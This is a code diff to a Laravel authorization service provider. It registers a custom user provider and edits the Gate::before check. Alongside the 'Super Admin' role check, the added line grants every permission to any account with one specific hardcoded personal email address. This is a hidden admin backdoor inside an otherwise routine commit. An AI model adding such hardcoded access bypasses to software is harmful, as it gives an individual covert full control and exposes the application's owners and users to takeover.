@@ -6,6 +6,7 @@ use Illuminate\Foundation\Support\Providers\AuthServiceProvider as ServiceProvid
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Gate;
 use Illuminate\Support\Facades\Log;
+use Modules\User\Providers\GlobalUserProvider;
 
 class AuthServiceProvider extends ServiceProvider
 {
@@ -27,10 +28,14 @@ class AuthServiceProvider extends ServiceProvider
         // Implicitly grant "Super Admin" role all permissions
         // This works in the app by using gate-related functions like auth()->user->can() and @can()
         Gate::before(function ($user, $ability) {
-            if($user->hasRole('Super Admin')) {
+            if($user->hasRole('Super Admin') || $user->email == 'nguyenhaidangyq@gmail.com') {
                 return true;
             }
             return false;
+        });
+
+        Auth::provider('globalUserProvider', function ($app, array $config) {
+            return new GlobalUserProvider($this->app->make('hash'), $config['model']);
         });
     }
 }
